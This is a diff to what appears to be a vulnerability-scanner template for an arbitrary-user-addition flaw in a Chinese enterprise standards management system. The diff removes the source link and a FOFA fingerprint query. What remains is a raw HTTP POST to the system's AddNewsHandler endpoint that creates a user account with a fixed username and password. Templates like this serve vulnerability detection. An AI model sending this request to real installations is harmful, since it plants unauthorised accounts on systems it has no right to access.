@@ -3,12 +3,8 @@ info:
   name: 润申企业标准化管理系统任意用户添加漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ff5ulvr6drb9xds7'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ff5ulvr6drb9xds7
-    fofa: body="PDCA/js/_publicCom.js"
 http:
 - raw:
   - 'POST /PDCA/ashx/AddNewsHandler.ashx?action=Adduser HTTP/1.1
@@ -27,8 +23,6 @@ http:
 
 
     Connection: close
-
-
 
 
     username=dudesite&pwd=dudesite1234&savedays=1
